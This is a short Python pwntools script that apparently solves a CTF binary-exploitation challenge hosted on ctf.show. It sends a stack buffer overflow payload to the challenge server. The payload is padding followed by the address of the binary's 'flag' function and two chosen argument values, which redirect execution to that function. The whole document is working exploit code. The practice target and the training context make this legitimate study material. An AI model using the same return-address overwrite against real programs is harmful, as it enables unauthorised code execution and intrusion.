from pwn import*
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28159)
elf = ELF('./pwn')
flag = elf.sym['flag']
payload='a'*(0x6c+4) + p32(flag) + p32(0) + p32(0x36c) + p32(0x36d)
io.sendline(payload)
io.interactive()
